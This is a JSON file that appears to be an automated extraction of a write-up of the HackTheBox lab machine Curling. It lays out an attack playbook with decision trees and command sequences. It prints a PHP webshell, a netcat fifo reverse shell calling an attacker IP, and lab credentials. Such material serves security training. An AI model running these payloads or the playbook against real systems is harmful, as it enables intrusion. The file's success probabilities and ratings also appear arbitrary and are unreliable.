@@ -1,0 +1,1032 @@
+{
+  "writeup_id": "Htb_Curling",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_joomla_cms_credential_disclosure",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "credential_disclosure_to_cms_admin",
+    "privilege_path": "web_user_to_root_via_cron",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "html_comment_credential_hint",
+      "base64_encoded_password",
+      "joomla_admin_template_upload",
+      "curl_config_file_control"
+    ],
+    "environmental_clues": [
+      "joomla_cms_generator_header",
+      "secret_txt_file",
+      "administrator_panel_access",
+      "ubuntu_18_04_fingerprint"
+    ],
+    "similar_scenarios": [
+      "joomla_template_injection",
+      "cms_admin_takeover"
+    ],
+    "unique_aspects": [
+      "password_in_html_comment",
+      "curl_cron_configuration_hijack",
+      "compressed_backup_file_discovery"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "HTML Source Comment Discovery",
+        "success_reason": "Developer left secret.txt reference in HTML comment",
+        "prerequisite_indicators": [
+          "web_application_present",
+          "source_code_accessible",
+          "developer_comments_exist"
+        ],
+        "recognition_patterns": [
+          "<!-- secret.txt --> in HTML source",
+          "base64 encoded strings in comments",
+          "filename references in comments"
+        ],
+        "failure_modes": [
+          "no_html_comments",
+          "comments_removed_in_production",
+          "obfuscated_references"
+        ],
+        "environmental_factors": [
+          "development_artifacts_in_production",
+          "insufficient_code_review",
+          "poor_deployment_practices"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Base64 Credential Decoding",
+        "success_reason": "Password stored as base64 in accessible file",
+        "prerequisite_indicators": [
+          "base64_encoded_strings_found",
+          "secret_files_accessible",
+          "weak_encoding_used"
+        ],
+        "recognition_patterns": [
+          "Q3VybGluZzIwMTgh pattern (base64)",
+          "equals padding in strings",
+          "alphanumeric+/= character sets"
+        ],
+        "failure_modes": [
+          "proper_encryption_used",
+          "files_not_accessible",
+          "complex_encoding_schemes"
+        ],
+        "environmental_factors": [
+          "developer_misunderstanding_of_security",
+          "quick_deployment_shortcuts",
+          "lack_of_proper_secrets_management"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "1-2 minutes"
+      },
+      {
+        "technique": "Joomla Admin Panel Access",
+        "success_reason": "Weak credentials floris/Curling2018! worked",
+        "prerequisite_indicators": [
+          "joomla_cms_identified",
+          "admin_panel_accessible",
+          "weak_password_policy"
+        ],
+        "recognition_patterns": [
+          "/administrator endpoint available",
+          "Joomla generator meta tag",
+          "predictable username patterns"
+        ],
+        "failure_modes": [
+          "strong_passwords_enforced",
+          "account_lockout_enabled",
+          "admin_panel_restricted"
+        ],
+        "environmental_factors": [
+          "default_joomla_configuration",
+          "weak_password_practices",
+          "no_brute_force_protection"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "Joomla Template PHP Injection",
+        "success_reason": "Admin access allowed template modification",
+        "prerequisite_indicators": [
+          "joomla_admin_access_obtained",
+          "template_editing_enabled",
+          "php_execution_allowed"
+        ],
+        "recognition_patterns": [
+          "Extensions > Templates menu available",
+          "file creation/editing permitted",
+          "PHP template files accessible"
+        ],
+        "failure_modes": [
+          "template_editing_disabled",
+          "file_permissions_restricted",
+          "php_execution_blocked"
+        ],
+        "environmental_factors": [
+          "default_joomla_permissions",
+          "unrestricted_admin_capabilities",
+          "web_server_php_execution"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "3-7 minutes"
+      },
+      {
+        "technique": "Hexdump File Analysis",
+        "success_reason": "password_backup contained recoverable compressed data",
+        "prerequisite_indicators": [
+          "backup_files_accessible",
+          "hexdump_format_recognized",
+          "compression_signatures_present"
+        ],
+        "recognition_patterns": [
+          "BZh91AY signature (bzip2)",
+          "xxd hexdump format",
+          "password_backup filename"
+        ],
+        "failure_modes": [
+          "proper_encryption_used",
+          "backup_files_secured",
+          "unrecoverable_compression"
+        ],
+        "environmental_factors": [
+          "insecure_backup_practices",
+          "weak_data_protection",
+          "accessible_user_directories"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "secret.txt file reference",
+        "discovery_method": "HTML source code inspection",
+        "why_critical": "Led to base64 encoded password discovery",
+        "how_to_recognize": [
+          "HTML comment containing filename",
+          "developer artifacts in source",
+          "hidden file references"
+        ],
+        "follow_up_actions": [
+          "access_referenced_file",
+          "decode_base64_content",
+          "test_credentials_on_login"
+        ]
+      },
+      {
+        "discovery": "floris user credentials",
+        "discovery_method": "Base64 decoding of secret.txt",
+        "why_critical": "Provided Joomla admin access for code execution",
+        "how_to_recognize": [
+          "base64 encoded strings",
+          "password-like decoded content",
+          "username enumeration from posts"
+        ],
+        "follow_up_actions": [
+          "test_joomla_admin_login",
+          "explore_admin_functionality",
+          "identify_code_execution_paths"
+        ]
+      },
+      {
+        "discovery": "password_backup hexdump file",
+        "discovery_method": "File system enumeration in user directory",
+        "why_critical": "Contained compressed password for privilege escalation",
+        "how_to_recognize": [
+          "hexdump format with BZh signature",
+          "backup-related filenames",
+          "accessible user home directories"
+        ],
+        "follow_up_actions": [
+          "convert_hexdump_to_binary",
+          "decompress_multiple_layers",
+          "extract_password_content"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous_web_user",
+        "escalation_method": "credential_discovery_to_admin",
+        "why_possible": "Credentials exposed in web-accessible file",
+        "recognition_signs": [
+          "html_source_comments",
+          "base64_encoded_secrets",
+          "predictable_file_locations"
+        ],
+        "exploitation_path": "HTML comment → secret.txt → base64 decode → admin login"
+      },
+      {
+        "privilege_level": "joomla_admin",
+        "escalation_method": "template_php_injection",
+        "why_possible": "Admin users can modify PHP template files",
+        "recognition_signs": [
+          "template_editing_permissions",
+          "php_file_creation_allowed",
+          "web_accessible_template_directory"
+        ],
+        "exploitation_path": "Admin login → Template modification → PHP webshell → reverse shell"
+      },
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "backup_file_analysis",
+        "why_possible": "Compressed password backup accessible in user directory",
+        "recognition_signs": [
+          "readable_user_home_directories",
+          "backup_files_present",
+          "weak_backup_encryption"
+        ],
+        "exploitation_path": "File enumeration → hexdump analysis → decompression → password extraction"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and credential discovery",
+        "reasoning": "Limited attack surface requires thorough web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_brute_force",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "version_specific_exploits",
+            "when": "if vulnerable services found"
+          }
+        ],
+        "success_indicators": [
+          "cms_identified",
+          "version_discovered",
+          "admin_panel_found"
+        ],
+        "next_decision": "enumerate_cms_vulnerabilities"
+      },
+      {
+        "step": 2,
+        "situation": "Joomla CMS identified with version 3.8.8",
+        "decision": "Search for credentials in source code and common files before exploit research",
+        "reasoning": "Easy boxes often have credential-based entry points rather than complex exploits",
+        "confidence": 0.85,
+        "prerequisites": [
+          "cms_version_confirmed",
+          "admin_panel_accessible"
+        ],
+        "success_indicators": [
+          "credentials_found",
+          "admin_access_gained"
+        ],
+        "failure_fallbacks": [
+          "version_specific_exploits",
+          "directory_bruteforce",
+          "default_credentials"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found HTML comment pointing to secret.txt with base64 encoded content",
+        "decision": "Decode content and test as password with discovered usernames",
+        "reasoning": "Base64 encoded strings in CTF environments often contain credentials",
+        "confidence": 0.95,
+        "prerequisites": [
+          "secret_file_found",
+          "potential_usernames_identified"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "admin_panel_access"
+        ],
+        "failure_fallbacks": [
+          "password_variations",
+          "wordlist_generation"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Gained Joomla admin access with floris:Curling2018!",
+        "decision": "Upload PHP webshell through template modification",
+        "reasoning": "Template editing is standard privilege escalation path in CMS admin panels",
+        "confidence": 0.95,
+        "prerequisites": [
+          "admin_panel_access",
+          "template_editing_enabled"
+        ],
+        "success_indicators": [
+          "webshell_uploaded",
+          "code_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "plugin_upload",
+          "media_upload",
+          "configuration_modification"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_limited_ports_found": {
+        "action": "deep_web_enumeration",
+        "tools": [
+          "gobuster",
+          "nikto",
+          "source_code_analysis"
+        ],
+        "next_phase": "credential_discovery"
+      },
+      "if_cms_identified": {
+        "action": "version_enumeration_and_credential_search",
+        "alternatives": [
+          "exploit_research",
+          "default_credentials",
+          "source_analysis"
+        ],
+        "decision_criteria": "based_on_version_age_and_complexity"
+      },
+      "if_credentials_found": {
+        "action": "admin_panel_access_and_shell_upload",
+        "purpose": "establish_initial_foothold",
+        "tools": [
+          "template_modification",
+          "plugin_upload"
+        ]
+      },
+      "if_shell_obtained": {
+        "action": "local_enumeration_for_privesc",
+        "purpose": "find_privilege_escalation_paths",
+        "tools": [
+          "linpeas",
+          "manual_enumeration",
+          "file_analysis"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_html_comments_and_common_files",
+        "reasoning": "easy_boxes_often_hide_credentials_in_obvious_places",
+        "applicability": "ctf_and_easy_difficulty_targets"
+      },
+      {
+        "rule": "try_template_modification_first_in_cms_admin",
+        "reasoning": "most_reliable_method_for_code_execution",
+        "applicability": "cms_admin_access_obtained"
+      },
+      {
+        "rule": "decode_any_encoded_strings_found",
+        "reasoning": "base64_and_hex_often_contain_credentials_in_ctf",
+        "applicability": "encoded_content_discovered"
+      },
+      {
+        "rule": "examine_backup_files_thoroughly_for_credentials",
+        "reasoning": "backup_files_commonly_contain_sensitive_information",
+        "applicability": "backup_files_found_during_enumeration"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Joomla Admin Panel Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "joomla_cms_detected",
+          "admin_credentials_available",
+          "template_editing_enabled"
+        ],
+        "success_indicators": [
+          "administrator_panel_accessible",
+          "template_modification_possible",
+          "php_execution_enabled"
+        ],
+        "incompatible_with": [
+          "template_editing_disabled",
+          "php_execution_blocked",
+          "admin_panel_protected"
+        ],
+        "confidence_boosters": [
+          "joomla_generator_meta_tag",
+          "administrator_directory_accessible",
+          "default_joomla_structure"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Base64 Encoded Credential Discovery",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "source_code_accessible",
+          "encoded_strings_in_comments"
+        ],
+        "success_indicators": [
+          "html_comments_contain_hints",
+          "base64_strings_decode_successfully",
+          "decoded_strings_match_password_patterns"
+        ],
+        "incompatible_with": [
+          "source_code_obfuscated",
+          "comments_stripped",
+          "dynamic_content_only"
+        ],
+        "confidence_boosters": [
+          "secret_file_references",
+          "developer_comments_present",
+          "predictable_encoding_patterns"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "SSH Credential Reuse",
+        "mitre_id": "T1078.003",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "ssh_service_accessible",
+          "credentials_discovered_elsewhere",
+          "password_authentication_enabled"
+        ],
+        "success_indicators": [
+          "ssh_banner_responsive",
+          "password_auth_not_disabled",
+          "account_lockout_not_aggressive"
+        ],
+        "incompatible_with": [
+          "key_only_authentication",
+          "account_lockout_enabled",
+          "ssh_service_filtered"
+        ],
+        "confidence_boosters": [
+          "username_patterns_identified",
+          "default_ssh_configuration",
+          "no_fail2ban_detected"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "2-5 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "joomla_cms": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Joomla!",
+          "administrator/manifests/files/joomla.xml"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH 7.6p1 Ubuntu",
+          "Apache/2.4.29 (Ubuntu)"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "credential_discovery_via_source_analysis",
+          "when": "web_application_detected",
+          "reason": "often_reveals_hardcoded_credentials_or_hints"
+        },
+        {
+          "attack": "joomla_admin_exploitation",
+          "when": "joomla_detected_and_credentials_available",
+          "reason": "direct_path_to_code_execution"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ssh_credential_reuse",
+          "when": "ssh_service_detected_and_credentials_discovered",
+          "reason": "common_credential_reuse_pattern"
+        },
+        {
+          "attack": "cms_version_specific_exploits",
+          "when": "outdated_cms_version_detected",
+          "reason": "known_vulnerabilities_may_exist"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Joomla Admin Panel Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -s {target}/administrator/manifests/files/joomla.xml | head",
+            "actual_command": "curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | head",
+            "output_pattern": "<version>{version}</version>",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "base64",
+            "command_template": "curl -s {target}/secret.txt | base64 -d",
+            "actual_command": "curl -s http://10.10.10.150/secret.txt | base64 -d",
+            "output_pattern": "Curling2018!",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          }
+        ],
+        "prerequisites": [
+          "joomla_cms_identified",
+          "admin_panel_accessible",
+          "weak_credentials_available"
+        ],
+        "success_indicators": [
+          "admin_panel_login_successful",
+          "template_modification_possible",
+          "php_code_execution_achieved"
+        ],
+        "common_failures": [
+          "strong_admin_credentials",
+          "admin_panel_disabled",
+          "template_modification_restricted"
+        ],
+        "follow_up_techniques": [
+          "php_webshell_deployment",
+          "reverse_shell_execution",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "PHP Webshell via Template Modification",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "persistence",
+        "tools_used": [
+          {
+            "name": "joomla_admin_panel",
+            "command_template": "Extensions -> Templates -> {template_name} -> New File",
+            "actual_command": "Extensions -> Templates -> Beez3 -> New File -> sh3ll.php",
+            "output_pattern": "<?php system($_GET['0xdf']); ?>",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "curl",
+            "command_template": "curl {target}/templates/{template}/shell.php?cmd={command}",
+            "actual_command": "http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=id",
+            "output_pattern": "uid=33(www-data) gid=33(www-data)",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "joomla_admin_access",
+          "template_write_permissions",
+          "php_execution_enabled"
+        ],
+        "success_indicators": [
+          "webshell_file_created",
+          "command_execution_confirmed",
+          "www-data_shell_obtained"
+        ],
+        "common_failures": [
+          "template_write_restrictions",
+          "php_execution_disabled",
+          "file_upload_blocked"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_upgrade",
+          "local_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Multi-Layer Archive Decompression",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "xxd",
+            "command_template": "xxd -r {hexdump_file} > {output_file}",
+            "actual_command": "cat password_backup | xxd -r > password_backup.bz2",
+            "output_pattern": "binary file created",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          },
+          {
+            "name": "bunzip2",
+            "command_template": "bunzip2 -k {file}.bz2",
+            "actual_command": "bunzip2 -k password_backup.bz2",
+            "output_pattern": "decompressed file",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          },
+          {
+            "name": "gunzip",
+            "command_template": "gunzip -k {file}.gz",
+            "actual_command": "gunzip -k password_backup.gz",
+            "output_pattern": "decompressed file",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          },
+          {
+            "name": "tar",
+            "command_template": "tar xvf {file}.tar",
+            "actual_command": "tar xvf password_backup.tar",
+            "output_pattern": "password.txt",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          }
+        ],
+        "prerequisites": [
+          "file_system_access",
+          "compression_tools_available",
+          "readable_backup_files"
+        ],
+        "success_indicators": [
+          "hex_dump_converted_successfully",
+          "multiple_compression_layers_removed",
+          "plaintext_password_extracted"
+        ],
+        "common_failures": [
+          "corrupted_archive_files",
+          "missing_decompression_tools",
+          "insufficient_disk_space"
+        ],
+        "follow_up_techniques": [
+          "credential_validation",
+          "user_account_switching",
+          "ssh_authentication"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Reverse Shell via Named Pipe",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "netcat",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 443",
+            "output_pattern": "listening on [any] 443",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "fifo_shell",
+            "command_template": "cat /tmp/df | /bin/sh -i 2>&1 | nc {attacker_ip} {port} > /tmp/df",
+            "actual_command": "cat /tmp/df | /bin/sh -i 2>&1 | nc 10.10.14.5 443 > /tmp/df",
+            "output_pattern": "interactive shell connection",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "command_execution_capability",
+          "network_connectivity",
+          "netcat_available_on_target"
+        ],
+        "success_indicators": [
+          "reverse_connection_established",
+          "interactive_shell_obtained",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "firewall_blocking_outbound",
+          "netcat_not_available",
+          "url_encoding_issues"
+        ],
+        "follow_up_techniques": [
+          "shell_stabilization",
+          "privilege_escalation",
+          "persistence_establishment"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "CyberChef",
+        "use_case": "multi_layer_decompression_analysis",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "forensic_analysis",
+          "data_extraction"
+        ],
+        "alternatives": [
+          "manual_command_line_tools",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_detect_file_type_recipe",
+          "chain_decompression_operations",
+          "save_session_urls_for_documentation"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "service_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "reconnaissance",
+          "service_identification"
+        ],
+        "alternatives": [
+          "masscan",
+          "rustscan"
+        ],
+        "best_practices": [
+          "use_min_rate_for_faster_scans",
+          "combine_tcp_and_service_detection",
+          "save_output_in_multiple_formats"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "joomla_reconnaissance_to_admin_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -sT -p- --min-rate 5000 10.10.10.150",
+            "purpose": "Port discovery",
+            "expected_output": "22/tcp open ssh, 80/tcp open http"
+          },
+          {
+            "step": 2,
+            "command": "curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | head",
+            "purpose": "Joomla version identification",
+            "expected_output": "Version 3.8.8"
+          },
+          {
+            "step": 3,
+            "command": "curl -s http://10.10.10.150/secret.txt | base64 -d",
+            "purpose": "Extract hidden credentials",
+            "expected_output": "Curling2018!"
+          },
+          {
+            "step": 4,
+            "command": "Login to /administrator with floris:Curling2018!",
+            "purpose": "Admin panel access",
+            "expected_output": "Successful admin login"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-15 minutes"
+      },
+      {
+        "sequence_name": "webshell_to_reverse_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create sh3ll.php in Beez3 template with <?php system($_GET['0xdf']); ?>",
+            "purpose": "Deploy webshell",
+            "expected_output": "File created successfully"
+          },
+          {
+            "step": 2,
+            "command": "curl http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=id",
+            "purpose": "Test webshell functionality",
+            "expected_output": "uid=33(www-data)"
+          },
+          {
+            "step": 3,
+            "command": "nc -lnvp 443",
+            "purpose": "Setup reverse shell listener",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 4,
+            "command": "Execute fifo reverse shell via webshell",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Interactive shell as www-data"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "password_backup_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "cat password_backup | xxd -r > password_backup.bz2",
+            "purpose": "Convert hex dump to binary",
+            "expected_output": "Binary bz2 file created"
+          },
+          {
+            "step": 2,
+            "command": "bunzip2 -k password_backup.bz2",
+            "purpose": "First decompression",
+            "expected_output": "Gzip compressed file"
+          },
+          {
+            "step": 3,
+            "command": "gunzip -k password_backup.gz",
+            "purpose": "Second decompression",
+            "expected_output": "Another bz2 file"
+          },
+          {
+            "step": 4,
+            "command": "bunzip2 -k password_backup2.bz2",
+            "purpose": "Third decompression",
+            "expected_output": "Tar archive"
+          },
+          {
+            "step": 5,
+            "command": "tar xvf password_backup.tar",
+            "purpose": "Extract tar contents",
+            "expected_output": "password.txt with 5d<wdCbdZu)|hChXll"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Curling",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2018-10-27",
+      "author": "L4mpje",
+      "estimated_time": "45-75 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_application",
+        "credential_reuse",
+        "file_manipulation"
+      ],
+      "key_vulnerabilities": [
+        "weak_credentials",
+        "joomla_exploitation",
+        "cron_misconfiguration",
+        "curl_config_injection"
+      ],
+      "environment_type": "web_server_cms",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "cms_exploitation",
+        "file_decompression",
+        "cron_abuse",
+        "curl_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_enumeration",
+        "joomla_basics",
+        "linux_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "cms_exploitation",
+        "privilege_escalation",
+        "credential_attacks"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_cms_configuration",
+        "proper_file_permissions",
+        "secure_cron_jobs",
+        "input_validation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Blocky",
+        "Popcorn",
+        "Beep"
+      ],
+      "similarity_reasons": [
+        "cms_exploitation",
+        "web_enumeration",
+        "file_based_attacks"
+      ],
+      "unique_aspects": [
+        "curl_config_exploitation",
+        "compressed_backup_analysis",
+        "snapd_vulnerability"
+      ],
+      "difficulty_factors": [
+        "straightforward_enumeration",
+        "basic_file_manipulation",
+        "well_known_techniques"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T23:12:59.093740",
+    "original_file": "0xdf_writeups/Htb Curling.md",
+    "content_length": 26999,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
